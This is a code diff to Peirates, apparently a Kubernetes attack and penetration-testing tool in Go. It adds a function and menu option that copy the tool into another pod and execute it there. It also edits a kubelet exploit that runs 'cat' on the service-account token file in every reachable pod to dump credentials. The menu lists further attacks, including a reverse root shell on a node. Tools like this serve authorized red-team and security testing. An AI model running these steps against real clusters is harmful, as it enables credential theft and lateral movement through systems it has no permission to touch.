@@ -247,6 +247,50 @@ func execInListPods(connectionString ServerInfo, pods []string, command string) 
 	}
 }
 
+func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
+	//if !kubectlAuthCanI(connectionString, "exec", "pods") {
+	//	println("[-] Permission Denied: your service account isn't allowed to exec into pods")
+	//	return
+	//}
+
+	println("[+] Transferring a copy of Peirates into pod:", pod)
+
+	// modify the below so that we send in an stream of data that we read the equivalent of $_ from our own fs
+	filename := os.Getenv("_")
+	// peiratesBinary, err := ioutil.ReadFile("./" + filename)
+	_, err := ioutil.ReadFile("./" + filename)
+	if err != nil {
+		println("[-] Could not read peirates binary")
+		return
+	}
+	println("DEBUG: peiratesBinary loaded in - stopping now")
+	return
+
+	// Can we use this to push the binary through?
+	// runKubectlWithByteSliceForStdin is runKubectlSimple but you can pass in some bytes for stdin. Conven
+	// func runKubectlWithByteSliceForStdin(cfg ServerInfo, stdinBytes []byte, cmdArgs ...string) ([]byte, []byte, error) {
+
+	// copyIntoPodOut, _, err := runKubectlWithByteSliceForStdin(connectionString, kubectlBinary , "exec", "-it", pod, "--", "/bin/sh", "-c", "cat >/peirates ; chmod u+x /peirates")
+
+	copyIntoPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", pod, "--", "/bin/sh", "-c", "cat >/peirates ; chmod u+x /peirates")
+	if err != nil {
+		fmt.Printf("[-] Copying peirates into Pod %s failed: %s\n", pod, err)
+	} else {
+		println(" ")
+		println(string(copyIntoPodOut))
+	}
+
+	// modify the below so that we begin a true interactive session with that pod, running peirates directly.
+	execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", pod, "--", "/bin/sh", "-c", "/peirates")
+	if err != nil {
+		fmt.Printf("[-] Executing peirates in Pod %s failed: %s\n", pod, err)
+	} else {
+		println(" ")
+		println(string(execInPodOut))
+	}
+
+}
+
 //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 // Added mountFS code to create yaml file drop to disk and create a pod.    |
 //--------------------------------------------------------------------------|
@@ -834,10 +878,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								}
 								sslClient := &http.Client{Transport: tr}
 
-								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
+								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""
 
 								data := url.Values{}
-								data.Set("cmd", "cat /run/secrets/kubernetes.io/serviceaccount/token")
+								data.Set("cmd", "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
 								// data.Set("cmd", "hostname")
 
 								urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"
@@ -936,6 +980,7 @@ Compromise |
 [20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod
 [21] Run command in one or all pods in this namespace via the API Server (RBAC permitting)
 [22] Run a token-dumping command in all pods via Kubelets (authorization/Webhook permitting)
+[30] Inject peirates into another pod via API Server (RBAC permitting)
 -----------------+
 Off-Menu         +
 -----------------+
@@ -1448,6 +1493,12 @@ Leave off the "kubectl" part of the command.  For example:
 		// [22] Use the kubelet to gain the token in every pod where we can run a command
 		case "22":
 			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
+		case "30":
+			var podName string
+
+			println("Enter the name of a pod to inject peirates into: ")
+			fmt.Scanln(&podName)
+			injectIntoAPodViaAPIServer(connectionString, podName)
 		case "98":
 			break
 		case "99":
